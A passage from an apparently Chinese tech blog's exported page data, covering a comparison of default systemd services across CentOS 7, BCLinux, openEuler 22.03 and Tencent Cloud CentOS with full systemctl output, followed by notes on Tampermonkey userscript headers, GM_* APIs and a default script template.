└─469 /usr/bin/qemu-ga --method=virtio-serial --path=/dev/virtio-ports/org.qemu.guest_agent.0 --blacklist=guest-file-open,guest-file-close,guest-file-read,guest-file-write,guest-file-seek,guest-file-flush,guest-exec,guest-exec-status -F/etc/qemu-ga/fsfreeze-hook</span><br><span class=\"line\">             ├─auditd.service</span><br><span class=\"line\">             │ └─446 /sbin/auditd</span><br><span class=\"line\">             ├─systemd-udevd.service</span><br><span class=\"line\">             │ └─381 /usr/lib/systemd/systemd-udevd</span><br><span class=\"line\">             └─systemd-journald.service</span><br><span class=\"line\">               └─354 /usr/lib/systemd/systemd-journald</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>network、cloud-init等服务是一次性启动，并非常驻内存，因此<code>systemmctl status</code>不提供<br>可以通过<code>systemctl list-unit-files</code></p>\n</blockquote>\n<p>与内核密切相关，一般作为必须的基础服务：</p>\n<ul>\n<li><code>rsyslog</code>: Rocket-fast System Logging Service，用于操作系统收集各种日志信息</li>\n<li><code>tuned</code>：Dynamic System Tuning Daemon，监视系统组件运行状态，动态优化Linux内核</li>\n<li><code>polkit</code>：Authorization Manager，非特权用户会话与特权系统环境之间的协商者</li>\n<li><code>dbus</code>：D-Bus System Message Bus，用于进程与内核、进程之间的通信总线</li>\n<li><code>auditd</code>：Security Auditing Service，负责将Linux审计记录写入磁盘</li>\n<li><code>sshd</code>：OpenSSH server daemon，SSH后台服务</li>\n<li><code>systemd-udevd</code>：udev Kernel Device Manager，Linux默认的物理设备管理工具</li>\n<li><code>systemd-journald</code>：Journal Service，systemd 的标准日志工具</li>\n<li><code>systemd-logind</code>：Login Service，登录服务</li>\n<li><code>crond</code>：Command Scheduler，定时任务调度服务</li>\n</ul>\n<p>与应用相关，一般作为可选的服务：</p>\n<ul>\n<li><code>postfix</code>：Postfix Mail Transport Agent，邮件发送服务，注意是主机mail，经常被手工屏蔽</li>\n<li><code>firewalld</code>：dynamic firewall daemon，系统防火墙服务，通常被手工屏蔽</li>\n<li><code>NetworkManager</code>：Network Manager，网络管理服务</li>\n<li><code>qemu-guest-agent</code>：QEMU Guest Agent，虚拟机和宿主机的命令通道</li>\n</ul>\n<p>注意！systemd 状态显示为 degraded，而非 runnning，说明有系统进程发生异常。<br>通过 <code>systemctl --state=failed</code> 检查发现是 kdump.service ，原因是操作系统安装时没选配置。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">  UNIT          LOAD   ACTIVE SUB    DESCRIPTION</span><br><span class=\"line\">● kdump.service loaded failed failed Crash recovery kernel arming</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、BCLinux-的基线版本分析\"><a href=\"#三、BCLinux-的基线版本分析\" class=\"headerlink\" title=\"三、BCLinux 的基线版本分析\"></a>三、BCLinux 的基线版本分析</h2><p>众所周知，BCLinux oe21.10 是基于 openEuler 21.10 的套娃版本，但也做了一些调整：</p>\n<p>删除的服务有：</p>\n<ul>\n<li><code>auditd</code>：影响安全审计，不合理！</li>\n<li><code>postfix</code>：没啥用，而且可能造成日志磁盘满，合理！</li>\n<li><code>qemu-guest-agent</code>：需要用户自行安装</li>\n</ul>\n<p>增加的服务有：</p>\n<ul>\n<li><code>rngd</code>：Hardware RNG Entropy Gatherer Daemon。使用环境噪声和硬件随机数生成器来生成熵，并存储到内核的随机数熵池</li>\n<li><code>chronyd</code>：另一个版本的 NTP 时间服务器</li>\n<li><code>systemd-networkd</code>：systemd 提供的网络管理工具。已有 NetworkManager ，这个可删除</li>\n</ul>\n<p>除了之前的 kdump ，还发现了 1 个异常的服务：</p>\n<ul>\n<li><code>lm_sensors</code>: 检测CentOS系统的CPU温度，对于虚拟机没意义！</li>\n</ul>\n<h2 id=\"四、openEuler-22-03-的基线版本分析\"><a href=\"#四、openEuler-22-03-的基线版本分析\" class=\"headerlink\" title=\"四、openEuler 22.03 的基线版本分析\"></a>四、openEuler 22.03 的基线版本分析</h2><p>与 BCLinux oe21.10 对比分析，可以发现：</p>\n<ul>\n<li>直接删除了 <code>firewalld</code></li>\n<li>同样删除了 <code>postfix</code> ，但保留了 <code>auditd</code></li>\n<li>同样增加了 <code>rngd</code> 和 <code>chronyd</code> 的系统服务</li>\n<li>保留了虚拟机的组件 <code>qemu-guest-agent</code>，但又增加了 <code>acpid</code>？</li>\n<li>增加了用于 NFS 服务的组件 <code>gssproxy</code> 和 <code>rpcbind</code>，似乎并不合理？</li>\n<li>增加了 <code>restorecond</code>，用于给 SELinux 监测和重新加载正确的文件上下文</li>\n<li>增加了<code>systemd-hostnamed</code>，用于修改主机名称，似乎多余了！</li>\n<li>网络管理软件仍然是 NetworkManager</li>\n</ul>\n<h2 id=\"五、腾讯云-Centos-7-的基线版本\"><a href=\"#五、腾讯云-Centos-7-的基线版本\" class=\"headerlink\" title=\"五、腾讯云 Centos 7 的基线版本\"></a>五、腾讯云 Centos 7 的基线版本</h2><p>与标准的 Centos 安装版本相比，有以下变化：</p>\n<ul>\n<li>删除了 postdfix、firewalld，保留了 auditd</li>\n<li>网络管理直接基于 cloud-init 的静态文件配置，不采用 NetworkManager !!!</li>\n<li>启用基于 ntpd 的时间服务器</li>\n<li>启用虚拟机电源管理的 acpid ，但没有 qemu-guest-agent</li>\n</ul>\n<p>还有几个有意思的问题：</p>\n<ul>\n<li>启用了一个类似 crond 的调度任务系统 atd ，很奇怪？</li>\n<li>启用了 rhsmcertd：Red Hat Subscription Manager CERTification Daemon，红帽的订阅服务</li>\n<li>启用了 libstoragemgmt，用于 ceph 等后端存储阵列管理</li>\n<li>启用了 lvm2-lvmetad，用于 lvm2 的元数据管理，可能是安装 docker 引入的？</li>\n<li>启用了 tat_agent：TencentCloud Automation Tools，腾讯开发的自动化助手</li>\n</ul>\n<hr>\n<h2 id=\"附录一：Systemd-的进程管理\"><a href=\"#附录一：Systemd-的进程管理\" class=\"headerlink\" title=\"附录一：Systemd 的进程管理\"></a>附录一：Systemd 的进程管理</h2><p>系统中运行的所有进程，都是 systemd init 进程的子进程。在资源管控方面，systemd 提供了三种 unit 类型：</p>\n<ul>\n<li>service： 一个或一组进程，由 systemd 依据 unit 配置文件启动。service 对指定进程进行封装，这样进程可以作为一个整体被启动或终止。</li>\n<li>scope：一组外部创建的进程。由进程通过 fork() 函数启动和终止、之后被 systemd 在运行时注册的进程，scope 会将其封装。例如：用户会话、 容器和虚拟机被认为是 scope。</li>\n<li>slice： 一组按层级排列的 unit。slice 并不包含进程，但会组建一个层级，并将 scope 和 service 都放置其中。真正的进程包含在 scope 或 service 中。在这一被划分层级的树中，每一个 slice 单位的名字对应通向层级中一个位置的路径。</li>\n</ul>\n<p>默认情况下，systemd 会自动创建 slice、scope 和 service unit 的层级(slice、scope 和 service 都是 systemd 的 unit 类型，来为 cgroup 树提供统一的层级结构。</p>\n<ul>\n<li>.slice：根 slice</li>\n<li>system.slice：所有系统 service 的默认位置</li>\n<li>user.slice：所有用户会话的默认位置</li>\n<li>machine.slice：所有虚拟机和 Linux 容器的默认位置</li>\n</ul>\n<h2 id=\"附录二：Systemd-的管理目录\"><a href=\"#附录二：Systemd-的管理目录\" class=\"headerlink\" title=\"附录二：Systemd 的管理目录\"></a>附录二：Systemd 的管理目录</h2><p>Unit 文件按照 Systemd 约定，应该被放置指定的三个系统目录之一中。这三个目录是有优先级的，如下所示，越靠上的优先级越高。因此，在三个目录中有同名文件的时候，只有优先级最高的目录里的那个文件会被使用。</p>\n<ul>\n<li><code>/etc/systemd/system</code>：系统或用户自定义的配置文件</li>\n<li><code>/run/systemd/system</code>：软件运行时生成的配置文件</li>\n<li><code>/usr/lib/systemd/system</code>：系统或第三方软件安装时添加的配置文件。</li>\n</ul>\n<h2 id=\"附录三：Systemd-的配置管理\"><a href=\"#附录三：Systemd-的配置管理\" class=\"headerlink\" title=\"附录三：Systemd 的配置管理\"></a>附录三：Systemd 的配置管理</h2><p>CentOS7的服务systemctl脚本存放在:&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;,有系统（system）和用户（user）之分,需要开机不登陆就能运行的程序，存在系统服务里，即：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system目录下.<br>CentOS7的每一个服务以.service结尾，一般会分为3部分：[Unit]、[Service]和[Install]。</p>\n<p>[Unit]部分主要是对这个服务的说明，内容包括Description和After，Description 用于描述服务，After用于描述服务类别</p>\n<p>[Service]部分是服务的关键，是服务的一些具体运行参数的设置.</p>\n<ul>\n<li>Type&#x3D;forking是后台运行的形式，</li>\n<li>User&#x3D;users是设置服务运行的用户,</li>\n<li>Group&#x3D;users是设置服务运行的用户组,</li>\n<li>PIDFile为存放PID的文件路径，</li>\n<li>ExecStart为服务的具体运行命令,</li>\n<li>ExecReload为重启命令，</li>\n<li>ExecStop为停止命令，</li>\n<li>PrivateTmp&#x3D;True表示给服务分配独立的临时空间</li>\n</ul>\n<p>注意：[Service]部分的启动、重启、停止命令全部要求使用绝对路径，使用相对路径则会报错！</p>\n<p>[Install]部分是服务安装的相关设置，可设置为多用户的</p>\n<h2 id=\"附录四：systemctl-的全量信息\"><a href=\"#附录四：systemctl-的全量信息\" class=\"headerlink\" title=\"附录四：systemctl 的全量信息\"></a>附录四：systemctl 的全量信息</h2><figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@MiWiFi-RA70-srv ~]# systemctl</span><br><span class=\"line\">  UNIT                                                                                        LOAD   ACTIVE SUB       DESCRIPTION</span><br><span class=\"line\">  proc-sys-fs-binfmt_misc.automount                                                           loaded active waiting   Arbitrary Executable File Formats File System Automount Point</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:01.1-ata2-host1-target1:0:0-1:0:0:0-block-sr0.device         loaded active plugged   QEMU_DVD-ROM CentOS_7_x86_64</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:05.0-virtio1-host2-target2:0:0-2:0:0:0-block-sda-sda1.device loaded active plugged   QEMU_HARDDISK 1</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:05.0-virtio1-host2-target2:0:0-2:0:0:0-block-sda.device      loaded active plugged   QEMU_HARDDISK</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:08.0-virtio2-virtio\\x2dports-vport2p1.device                 loaded active plugged   /sys/devices/pci0000:00/0000:00:08.0/virtio2/virtio-ports/vport2p1</span><br><span class=\"line\">  sys-devices-pci0000:00-0000:00:12.0-virtio3-net-eth0.device                                 loaded active plugged   Virtio network device</span><br><span class=\"line\">  sys-devices-platform-serial8250-tty-ttyS0.device                                            loaded active plugged   /sys/devices/platform/serial8250/tty/ttyS0</span><br><span class=\"line\">  sys-devices-platform-serial8250-tty-ttyS1.device                                            loaded active plugged   /sys/devices/platform/serial8250/tty/ttyS1</span><br><span class=\"line\">  sys-devices-platform-serial8250-tty-ttyS2.device                                            loaded active plugged   /sys/devices/platform/serial8250/tty/ttyS2</span><br><span class=\"line\">  sys-devices-platform-serial8250-tty-ttyS3.device                                            loaded active plugged   /sys/devices/platform/serial8250/tty/ttyS3</span><br><span class=\"line\">  sys-module-configfs.device                                                                  loaded active plugged   /sys/module/configfs</span><br><span class=\"line\">  sys-subsystem-net-devices-eth0.device                                                       loaded active plugged   Virtio network device</span><br><span class=\"line\">  -.mount                                                                                     loaded active mounted   /</span><br><span class=\"line\">  dev-hugepages.mount                                                                         loaded active mounted   Huge Pages File System</span><br><span class=\"line\">  dev-mqueue.mount                                                                            loaded active mounted   POSIX Message Queue File System</span><br><span class=\"line\">  run-user-0.mount                                                                            loaded active mounted   /run/user/0</span><br><span class=\"line\">  sys-kernel-config.mount                                                                     loaded active mounted   Configuration File System</span><br><span class=\"line\">  sys-kernel-debug.mount                                                                      loaded active mounted   Debug File System</span><br><span class=\"line\">  systemd-ask-password-plymouth.path                                                          loaded active waiting   Forward Password Requests to Plymouth Directory Watch</span><br><span class=\"line\">  systemd-ask-password-wall.path                                                              loaded active waiting   Forward Password Requests to Wall Directory Watch</span><br><span class=\"line\">  session-1.scope                                                                             loaded active running   Session 1 of user root</span><br><span class=\"line\">  session-2.scope                                                                             loaded active running   Session 2 of user root</span><br><span class=\"line\">  auditd.service                                                                              loaded active running   Security Auditing Service</span><br><span class=\"line\">  crond.service                                                                               loaded active running   Command Scheduler</span><br><span class=\"line\">  dbus.service                                                                                loaded active running   D-Bus System Message Bus</span><br><span class=\"line\">  firewalld.service                                                                           loaded active running   firewalld - dynamic firewall daemon</span><br><span class=\"line\">  getty@tty1.service                                                                          loaded active running   Getty on tty1</span><br><span class=\"line\">● kdump.service                                                                               loaded failed failed    Crash recovery kernel arming</span><br><span class=\"line\">  kmod-static-nodes.service                                                                   loaded active exited    Create list of required static device nodes for the current kernel</span><br><span class=\"line\">  network.service                                                                             loaded active exited    LSB: Bring up/down networking</span><br><span class=\"line\">  NetworkManager-wait-online.service                                                          loaded active exited    Network Manager Wait Online</span><br><span class=\"line\">  NetworkManager.service                                                                      loaded active running   Network Manager</span><br><span class=\"line\">  polkit.service                                                                              loaded active running   Authorization Manager</span><br><span class=\"line\">  postfix.service                                                                             loaded active running   Postfix Mail Transport Agent</span><br><span class=\"line\">  qemu-guest-agent.service                                                                    loaded active running   QEMU Guest Agent</span><br><span class=\"line\">  rhel-dmesg.service                                                                          loaded active exited    Dump dmesg to /var/log/dmesg</span><br><span class=\"line\">  rhel-domainname.service                                                                     loaded active exited    Read and set NIS domainname from /etc/sysconfig/network</span><br><span class=\"line\">  rhel-import-state.service                                                                   loaded active exited    Import network configuration from initramfs</span><br><span class=\"line\">  rhel-readonly.service                                                                       loaded active exited    Configure read-only root support</span><br><span class=\"line\">  rsyslog.service                                                                             loaded active running   System Logging Service</span><br><span class=\"line\">  sshd.service                                                                                loaded active running   OpenSSH server daemon</span><br><span class=\"line\">  systemd-journal-flush.service                                                               loaded active exited    Flush Journal to Persistent Storage</span><br><span class=\"line\">  systemd-journald.service                                                                    loaded active running   Journal Service</span><br><span class=\"line\">  systemd-logind.service                                                                      loaded active running   Login Service</span><br><span class=\"line\">  systemd-random-seed.service                                                                 loaded active exited    Load/Save Random Seed</span><br><span class=\"line\">  systemd-remount-fs.service                                                                  loaded active exited    Remount Root and Kernel File Systems</span><br><span class=\"line\">  systemd-sysctl.service                                                                      loaded active exited    Apply Kernel Variables</span><br><span class=\"line\">  systemd-tmpfiles-setup-dev.service                                                          loaded active exited    Create Static Device Nodes in /dev</span><br><span class=\"line\">  systemd-tmpfiles-setup.service                                                              loaded active exited    Create Volatile Files and Directories</span><br><span class=\"line\">  systemd-udev-trigger.service                                                                loaded active exited    udev Coldplug all Devices</span><br><span class=\"line\">  systemd-udevd.service                                                                       loaded active running   udev Kernel Device Manager</span><br><span class=\"line\">  systemd-update-utmp.service                                                                 loaded active exited    Update UTMP about System Boot/Shutdown</span><br><span class=\"line\">  systemd-user-sessions.service                                                               loaded active exited    Permit User Sessions</span><br><span class=\"line\">  systemd-vconsole-setup.service                                                              loaded active exited    Setup Virtual Console</span><br><span class=\"line\">  tuned.service                                                                               loaded active running   Dynamic System Tuning Daemon</span><br><span class=\"line\">  -.slice                                                                                     loaded active active    Root Slice</span><br><span class=\"line\">  system-getty.slice                                                                          loaded active active    system-getty.slice</span><br><span class=\"line\">  system-selinux\\x2dpolicy\\x2dmigrate\\x2dlocal\\x2dchanges.slice                               loaded active active    system-selinux\\x2dpolicy\\x2dmigrate\\x2dlocal\\x2dchanges.slice</span><br><span class=\"line\">  system.slice                                                                                loaded active active    System Slice</span><br><span class=\"line\">  user-0.slice                                                                                loaded active active    User Slice of root</span><br><span class=\"line\">  user.slice                                                                                  loaded active active    User and Session Slice</span><br><span class=\"line\">  dbus.socket                                                                                 loaded active running   D-Bus System Message Bus Socket</span><br><span class=\"line\">  systemd-initctl.socket                                                                      loaded active listening /dev/initctl Compatibility Named Pipe</span><br><span class=\"line\">  systemd-journald.socket                                                                     loaded active running   Journal Socket</span><br><span class=\"line\">  systemd-shutdownd.socket                                                                    loaded active listening Delayed Shutdown Socket</span><br><span class=\"line\">  systemd-udevd-control.socket                                                                loaded active running   udev Control Socket</span><br><span class=\"line\">  systemd-udevd-kernel.socket                                                                 loaded active running   udev Kernel Socket</span><br><span class=\"line\">  basic.target                                                                                loaded active active    Basic System</span><br><span class=\"line\">  cryptsetup.target                                                                           loaded active active    Local Encrypted Volumes</span><br><span class=\"line\">  getty.target                                                                                loaded active active    Login Prompts</span><br><span class=\"line\">  local-fs-pre.target                                                                         loaded active active    Local File Systems (Pre)</span><br><span class=\"line\">  local-fs.target                                                                             loaded active active    Local File Systems</span><br><span class=\"line\">  multi-user.target                                                                           loaded active active    Multi-User System</span><br><span class=\"line\">  network-online.target                                                                       loaded active active    Network is Online</span><br><span class=\"line\">  network-pre.target                                                                          loaded active active    Network (Pre)</span><br><span class=\"line\">  network.target                                                                              loaded active active    Network</span><br><span class=\"line\">  paths.target                                                                                loaded active active    Paths</span><br><span class=\"line\">  remote-fs.target                                                                            loaded active active    Remote File Systems</span><br><span class=\"line\">  slices.target                                                                               loaded active active    Slices</span><br><span class=\"line\">  sockets.target                                                                              loaded active active    Sockets</span><br><span class=\"line\">  swap.target                                                                                 loaded active active    Swap</span><br><span class=\"line\">  sysinit.target                                                                              loaded active active    System Initialization</span><br><span class=\"line\">  timers.target                                                                               loaded active active    Timers</span><br><span class=\"line\">  systemd-tmpfiles-clean.timer                                                                loaded active waiting   Daily Cleanup of Temporary Directories</span><br><span class=\"line\"></span><br><span class=\"line\">LOAD   = Reflects whether the unit definition was properly loaded.</span><br><span class=\"line\">ACTIVE = The high-level unit activation state, i.e. generalization of SUB.</span><br><span class=\"line\">SUB    = The low-level unit activation state, values depend on unit type.</span><br><span class=\"line\"></span><br><span class=\"line\">84 loaded units listed. Pass --all to see loaded but inactive units, too.</span><br><span class=\"line\">To show all installed unit files use &#x27;systemctl list-unit-files&#x27;.</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.freedesktop.org/software/systemd/man/systemd.service.html\">Systemd 官方文档</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html?hmsr=toutiao.io&utm_medium=toutiao.io&utm_source=toutiao.io\">Systemd 入门教程：命令篇 - 阮一峰</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1516125\">Systemd 服务管理教程</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/651550778\">一次搞定 Linux systemd 服务脚本</a></li>\n<li><a href=\"https://www.cnblogs.com/sparkdev/p/9523194.html\">Cgroups 与 Systemd</a></li>\n<li><a href=\"https://www.jinbuguo.com/\">金步国作品集 - Linux</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/74319084\">Linux Kdump</a></li>\n<li><a href=\"https://www.cnblogs.com/alantu2018/p/8526970.html\">linux的 0号进程 和 1 号进程</a></li>\n</ul>\n"},{"title":"TamperMonkey开发文档","url":"/2020/12/03/TamperMonkey%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><h3 id=\"TamperMonkey\"><a href=\"#TamperMonkey\" class=\"headerlink\" title=\"TamperMonkey\"></a>TamperMonkey</h3><p>Tampermonkey 是一款免费的浏览器扩展和最为流行的用户脚本管理器，它适用于 Chrome, Microsoft Edge, Safari, Opera Next, 和 Firefox。</p>\n<p>虽然有些受支持的浏览器拥有原生的用户脚本支持，但 Tampermonkey 将在您的用户脚本管理方面提供更多的便利。 它提供了诸如便捷脚本安装、自动更新检查、标签中的脚本运行状况速览、内置的编辑器等众多功能， 同时Tampermonkey还有可能正常运行原本并不兼容的脚本。</p>\n<h3 id=\"Chrome-Extension\"><a href=\"#Chrome-Extension\" class=\"headerlink\" title=\"Chrome Extension\"></a>Chrome Extension</h3><p>从本质上讲，TamperMonkey是一个用于管理Chrome Extension的软件。</p>\n<p>我们经常说的 Chrome “插件”，其实不是真正意义上的 Chrome Plug-in，一般是指 Chrome Extension(简称“拓展”)。</p>\n<ul>\n<li>扩展（Extension），指的是通过调用 Chrome 提供的 Chrome API 来扩展浏览器功能的一种组件，工作在浏览器层面，使用 HTML + Javascript 语言开发。</li>\n<li>插件（Plug-in），指的是通过调用 Webkit 内核 NPAPI&#x2F;PPAPI 来扩展内核功能的一种组件，工作在内核层面，理论上可以用任何一种生成本地二进制程序的语言开发，比如 C&#x2F;C++、Delphi 等。比如 Flash player 插件，就属于这种类型。一般在网页中用 <code>&lt;object&gt;</code> 或者 <code>&lt;embed&gt;</code> 标签声明的部分，就要靠插件来渲染。</li>\n</ul>\n<img src=\"/2020/12/03/TamperMonkey%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/extension-architecture.png\" class=\"\" title=\"Chrome Extension的技术架构\">\n\n<p>Chrome 拓展的 JS 主要可以分为这 5 类：injected script、content-script、popup js、background js 和 devtools js，</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">JS种类</th>\n<th align=\"center\">可访问的API</th>\n<th align=\"center\">DOM访问情况</th>\n<th align=\"center\">JS访问情况</th>\n<th align=\"center\">直接跨域</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">injected script</td>\n<td align=\"center\">和普通 JS 无任何差别，不能访问任何扩展 API</td>\n<td align=\"center\">可以访问</td>\n<td align=\"center\">可以访问</td>\n<td align=\"center\">不可以</td>\n</tr>\n<tr>\n<td align=\"center\">content script</td>\n<td align=\"center\">只能访问 extension、runtime 等部分API</td>\n<td align=\"center\">可以访问</td>\n<td align=\"center\">不可以</td>\n<td align=\"center\">不可以</td>\n</tr>\n<tr>\n<td align=\"center\">popup js</td>\n<td align=\"center\">可访问绝大部分 API，除了 devtools 系列</td>\n<td align=\"center\">不可直接访问</td>\n<td align=\"center\">不可以</td>\n<td align=\"center\">可以</td>\n</tr>\n<tr>\n<td align=\"center\">background js</td>\n<td align=\"center\">可访问绝大部分 API，除了 devtools 系列</td>\n<td align=\"center\">不可直接访问</td>\n<td align=\"center\">不可以</td>\n<td align=\"center\">可以</td>\n</tr>\n<tr>\n<td align=\"center\">devtools js</td>\n<td align=\"center\">只能访问 devtools、extension、runtime 等部分API</td>\n<td align=\"center\">可以</td>\n<td align=\"center\">可以</td>\n<td align=\"center\">不可以</td>\n</tr>\n</tbody></table>\n<h2 id=\"二、用户脚本标记头\"><a href=\"#二、用户脚本标记头\" class=\"headerlink\" title=\"二、用户脚本标记头\"></a>二、用户脚本标记头</h2><ul>\n<li>@name</li>\n<li>@namespace</li>\n<li>@version</li>\n<li>@author</li>\n<li>@description</li>\n<li>@homepage, @homepageURL, @website and @source</li>\n<li>@icon, @iconURL and @defaulticon</li>\n<li>@icon64 and @icon64URL</li>\n<li>@updateURL</li>\n<li>@downloadURL</li>\n<li>@supportURL</li>\n<li>@include</li>\n<li>@match</li>\n<li>@exclude</li>\n<li>@require</li>\n<li>@resource</li>\n<li>@connect</li>\n<li>@run-at</li>\n<li>@grant</li>\n<li>@noframes</li>\n<li>@unwrap</li>\n<li>@nocompat</li>\n</ul>\n<h2 id=\"三、应用编程接口\"><a href=\"#三、应用编程接口\" class=\"headerlink\" title=\"三、应用编程接口\"></a>三、应用编程接口</h2><h3 id=\"通用类\"><a href=\"#通用类\" class=\"headerlink\" title=\"通用类\"></a>通用类</h3><ul>\n<li>GM_log(message)</li>\n<li>GM_info</li>\n</ul>\n<h3 id=\"本地存储类\"><a href=\"#本地存储类\" class=\"headerlink\" title=\"本地存储类\"></a>本地存储类</h3><p>GM存储并不是浏览器的localStorage数据，而是TM自行定义的，仅在本TM内部有效。</p>\n<ul>\n<li><p>GM_setValue(name, value)</p>\n</li>\n<li><p>GM_getValue(name, defaultValue)</p>\n</li>\n<li><p>GM_deleteValue(name)</p>\n</li>\n<li><p>GM_listValues()<br>这个函数的返回值很奇葩！是一个包含所有name的数组，而不是value。<br>而且，js中for循环中的自变量，如果母体是Array，自变量是计数器，而非数组的内容。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> names = <span class=\"title function_\">GM_listValues</span>();</span><br><span class=\"line\"><span class=\"keyword\">let</span> rs = <span class=\"keyword\">new</span> <span class=\"title class_\">Map</span>();</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> names) rs.<span class=\"title function_\">set</span>(names[i], <span class=\"title function_\">GM_getValue</span>(names[i]));</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;GM_listValues:&#x27;</span>, rs);</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p><code>GM_addValueChangeListener</code>可以对某个存储变量设置侦听器，用于不同浏览器选项卡的脚本之间的通信。<br>其中，回调函数的<code>remote</code>参数显示这个值是在另一个选项卡的实例中修改的<code>true</code>,还是在这个脚本实例中修改的<code>false</code>。</p>\n<ul>\n<li>GM_addValueChangeListener(name, function(name, old_value, new_value, remote) {})</li>\n<li>GM_removeValueChangeListener(listener_id)</li>\n</ul>\n<h3 id=\"配置信息类\"><a href=\"#配置信息类\" class=\"headerlink\" title=\"配置信息类\"></a>配置信息类</h3><ul>\n<li>GM_getResourceText(name)</li>\n<li>GM_getResourceURL(name)</li>\n<li>GM_registerMenuCommand(name, fn, accessKey)</li>\n<li>GM_unregisterMenuCommand(menuCmdId)</li>\n</ul>\n<h3 id=\"外部接口类\"><a href=\"#外部接口类\" class=\"headerlink\" title=\"外部接口类\"></a>外部接口类</h3><ul>\n<li>GM_openInTab(url, options), GM_openInTab(url, loadInBackground)<br>使用此url打开一个新选项卡，和<code>window.open()</code> 功能类似。<br>注意，其返回值并不是标准的<code>window</code>对象，而是一个包含函数close、侦听器onclosed、closed标记的奇怪对象。</li>\n<li>GM_xmlhttpRequest(details)<br>重要！！！由于TM运行在浏览器中，无法访问host数据，只能通过XHR保存爬取来的数据。</li>\n<li>GM_download(details), GM_download(url, name)</li>\n<li>GM_getTab(callback)</li>\n<li>GM_saveTab(tab)</li>\n<li>GM_getTabs(callback)</li>\n<li>GM_setClipboard(data, info)</li>\n</ul>\n<h3 id=\"DOM资源类\"><a href=\"#DOM资源类\" class=\"headerlink\" title=\"DOM资源类\"></a>DOM资源类</h3><ul>\n<li>unsafeWindow<br>  默认TM可以访问DOM，但不可以直接调用页面javascript函数。<br>  如果头文件包含<code>// @grant unsafeWindow</code>，就可以通过<code>safeWindow</code>对象提供对页面javascript函数和变量的完全访问</li>\n<li>GM_addStyle(css)<br>将给定的样式添加到文档并返回注入的样式元素。</li>\n<li>Subresource Integrity<br>@resource 和 @require 标记 URL 的哈希组件可用于此目的。</li>\n<li>GM_notification(details, ondone), GM_notification(text, title, image, onclick)<br>显示 HTML5 桌面通知和&#x2F;或突出显示当前选项卡。</li>\n<li>&lt;&gt;<![CDATA[your_text_here]]>&lt;&#x2F;&gt;<br>Tampermonkey支持这种存储元数据的方式。TM尝试自动检测脚本是否需要启用此兼容性选项。</li>\n</ul>\n<h2 id=\"四、TamperMonkey的默认用户脚本\"><a href=\"#四、TamperMonkey的默认用户脚本\" class=\"headerlink\" title=\"四、TamperMonkey的默认用户脚本\"></a>四、TamperMonkey的默认用户脚本</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ==UserScript==</span></span><br><span class=\"line\"><span class=\"comment\">// @name         New Userscript</span></span><br><span class=\"line\"><span class=\"comment\">// @namespace    http://tampermonkey.net/</span></span><br><span class=\"line\"><span class=\"comment\">// @version      0.1</span></span><br><span class=\"line\"><span class=\"comment\">// @description  try to take over the world!</span></span><br><span class=\"line\"><span class=\"comment\">// @author       You</span></span><br><span class=\"line\"><span class=\"comment\">// @match        http://*/*</span></span><br><span class=\"line\"><span class=\"comment\">// @grant        none</span></span><br><span class=\"line\"><span class=\"comment\">// ==/UserScript==</span></span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Your code here...</span></span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n\n<hr>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">--Start Firefox--</span><br><span class=\"line\">export DISPLAY=:0</span><br><span class=\"line\">source /etc/profile</span><br><span class=\"line\">/usr/bin/python3 -m webbrowser -t https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=1</span><br><span class=\"line\">␇</span><br><span class=\"line\">--end--</span><br><span class=\"line\">START /usr/bin/firefox &quot;https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=1&quot;</span><br><span class=\"line\">Failed to open connection to &quot;session&quot; message bus: /usr/bin/dbus-launch terminated abnormally with the following error:</span><br><span class=\"line\"> No protocol specified</span><br><span class=\"line\">Autolaunch error: X11 initialization failed.</span><br><span class=\"line\"></span><br><span class=\"line\">Running without a11y support!</span><br><span class=\"line\">No protocol specified</span><br><span class=\"line\">Error: cannot open display: :0</span><br><span class=\"line\">xdg-open: no method available for opening &#x27;https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=1&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" 